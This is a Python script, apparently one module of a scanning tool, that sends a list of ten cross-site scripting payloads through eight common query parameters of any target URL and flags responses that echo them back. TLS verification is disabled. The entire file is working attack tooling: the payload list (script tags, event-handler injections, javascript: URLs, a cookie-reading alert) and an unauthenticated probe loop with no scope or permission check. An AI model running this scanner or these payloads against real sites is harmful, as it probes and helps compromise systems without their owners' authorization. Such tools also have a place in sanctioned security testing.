import requests
import urllib3
urllib3.disable_warnings()

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "\"><img src=x onerror=alert(1)>",
    "<script>alert(document.cookie)</script>",
    "<svg/onload=alert(1)>",
]

def run(target):
    if not target.startswith("http"):
        target = "http://" + target

    print(f"    [*] Target: {target}")
    print(f"    [*] Testing {len(XSS_PAYLOADS)} XSS payloads...\n")

    found = []

    test_params = ["q", "search", "query", "input", "name", "id", "page", "s"]

    for param in test_params:
        for payload in XSS_PAYLOADS:
            test_url = f"{target}?{param}={payload}"
            try:
                r = requests.get(test_url, timeout=5, verify=False)
                if payload in r.text:
                    result = {
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "type": "Reflected XSS"
                    }
                    print(f"    \033[92m[+] XSS Found!\033[0m")
                    print(f"        URL: {test_url}")
                    print(f"        Param: {param}")
                    print(f"        Payload: {payload}\n")
                    found.append(result)
            except:
                pass

    if not found:
        print("    [-] No XSS vulnerabilities detected")

    return found
